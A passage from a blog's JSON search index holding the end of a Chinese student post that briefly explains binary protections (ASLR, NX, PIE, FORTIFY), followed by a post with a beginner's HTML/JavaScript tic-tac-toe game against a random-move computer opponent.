但是这个措施只是能降低缓冲区溢出攻击的成功率，并不是能完全防止溢出。 关于这个，多的我也说不上来，给几个文章的地址吧。 PIEPIE ，全称为 position-independent executables一般情况下NX和地址空间分布随机化会同时工作。在linux下内存空间随机化被称作PIE。 内存地址随机化机制，有以下三种情况： 1234参数 意义0 表示关闭进程地址空间随机化1 表示将mmap的基址，stack和vdso页面随机化2 表示在1的基础上增加栈（heap）的随机化 可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。 FORTIFY这个好像是编译器的保护措施，将函数名改变了，从而达到防止缓冲区溢出的作用。具体的坑emmm等我以后学会了些再来填吧。 系统防护（全）：二进制的保护机制WINDOWS和LINUX的内存防护机制","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"tech","slug":"tech","permalink":"http://siriuswhiter.tk/tags/tech/"}]},{"title":"JavaScript Naughts and Crosses","slug":"javascript-naughts-and-crosses","date":"2018-01-24T05:00:13.000Z","updated":"2018-10-18T10:25:23.617Z","comments":true,"path":"2018/01/24/javascript-naughts-and-crosses/","link":"","permalink":"http://siriuswhiter.tk/2018/01/24/javascript-naughts-and-crosses/","excerpt":"","text":"转移自之前的博客 学习html,js,css一周做了个粗糙的人机井字棋，虽然很丑，但是有彩蛋啊，比如说：黑白图片来自我c语言课设那刷屏的烫烫烫hhh。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;澳门皇家赌场&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;h1&#123;color:blue;&#125;table&#123;background-color:rgb(182,194,154);width:450px;height:450px;&#125;body&#123;background-color:rgb(131,175,155);&#125;&lt;/style&gt;&lt;script type=&quot;text/javascript&quot; &gt;alert(&quot;欢迎来到棋牌室！&quot;);var a=new Array(10)for(var i=0;i&lt;9;i++)a[i]=0;function start()&#123;for(var i=0;i&lt;9;i++)&#123; a[i]=0;document.getElementById(&quot;srci&quot;+String(i)).src=&quot;back.png&quot;;&#125;&#125;coun=0;function restart()&#123;window.location.reload();&#125;function img_change(id)&#123;var x=1;while(x==1)&#123;if(id==&quot;div0&quot;&amp;&amp;a[0]==0)&#123;a[0]=1;document.getElementById(&quot;srci0&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div1&quot;&amp;&amp;a[1]==0)&#123;a[1]=1;document.getElementById(&quot;srci1&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div2&quot;&amp;&amp;a[2]==0)&#123;a[2]=1;document.getElementById(&quot;srci2&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div3&quot;&amp;&amp;a[3]==0)&#123;a[3]=1;document.getElementById(&quot;srci3&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div4&quot;&amp;&amp;a[4]==0)&#123;a[4]=1;document.getElementById(&quot;srci4&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div5&quot;&amp;&amp;a[5]==0)&#123;a[5]=1;document.getElementById(&quot;srci5&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div6&quot;&amp;&amp;a[6]==0)&#123;a[6]=1;document.getElementById(&quot;srci6&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div7&quot;&amp;&amp;a[7]==0)&#123;a[7]=1;document.getElementById(&quot;srci7&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div8&quot;&amp;&amp;a[8]==0)&#123;a[8]=1;document.getElementById(&quot;srci8&quot;).src=&quot;timg.png&quot;;x=0;&#125;elsereturn;&#125;if(!(winner()))&#123;coun++;Robots_Time();&#125;if(!(winner())&amp;&amp;coun==9)alert(&quot;draw&quot;);&#125;function Robots_Time()&#123;var z=1;while(z==1)&#123;var ran=Math.random()*9;ran=parseInt(ran);if(a[ran]==0)&#123;a[ran]=2;document.getElementById(&quot;srci&quot;+String(ran)).src=&quot;white.png&quot;;coun++;z=0;&#125;&#125;winner();&#125;function winner()&#123;if(a[0]==2&amp;&amp;a[1]==2&amp;&amp;a[2]==2||a[0]==2&amp;&amp;a[4]==2&amp;&amp;a[8]==2||a[0]==2&amp;&amp;a[3]==2&amp;&amp;a[6]==2)&#123;alert(&quot;You failed&quot;);return 1;&#125;elseif(a[1]==2&amp;&amp;a[4]==2&amp;&amp;a[7]==2||a[2]==2&amp;&amp;a[5]==2&amp;&amp;a[8]==2||a[3]==2&amp;&amp;a[4]==2&amp;&amp;a[5]==2)&#123;alert(&quot;You failed&quot;);return 1;&#125;elseif(a[2]==2&amp;&amp;a[4]==2&amp;&amp;a[6]==2||a[6]==2&amp;&amp;a[7]==2&amp;&amp;a[8]==2)&#123;alert(&quot;You failed&quot;);return 1;&#125;if(a[0]==1&amp;&amp;a[1]==1&amp;&amp;a[2]==1||a[0]==1&amp;&amp;a[4]==1&amp;&amp;a[8]==1||a[0]==1&amp;&amp;a[3]==1&amp;&amp;a[6]==1)&#123;alert(&quot;You win!&quot;);return 1;&#125;elseif(a[1]==1&amp;&amp;a[4]==1&amp;&amp;a[7]==1||a[2]==1&amp;&amp;a[5]==1&amp;&amp;a[8]==1||a[3]==1&amp;&amp;a[4]==1&amp;&amp;a[5]==1)&#123;alert(&quot;You win!&quot;);return 1;&#125;elseif(a[2]==1&amp;&amp;a[4]==1&amp;&amp;a[6]==1||a[6]==1&amp;&amp;a[7]==1&amp;&amp;a[8]==1)&#123;alert(&quot;You win!&quot;);return 1;&#125;elsereturn 0;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;table border=&quot;1&quot;cellpadding=&quot;1&quot;cellspacing=&quot;1&quot;align=&quot;center&quot;&gt;&lt;caption&gt;Play with NPC&lt;audio loop=&quot;loop&quot; autoplay=&quot;autoplay/&quot;&gt;&lt;source src=&quot;I Need To Be In Love.mp3&quot; type=&quot;audio/mpeg&quot;&gt;&lt;/caption&gt;&lt;tr&gt;&lt;td align=&quot;center&quot; id=&quot;div0&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci0&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div1&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci1&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div2&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci2&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot; id=&quot;div3&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci3&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div4&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci4&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div5&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci5&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot; id=&quot;div6&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci6&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div7&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci7&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot; id=&quot;div8&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci8&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;center&gt;&lt;button onclick=&quot;restart()&quot;&gt;重新开始&lt;/button&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 附地址：点击与愚蠢的电脑过招井字棋，输了算你牛","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]}]}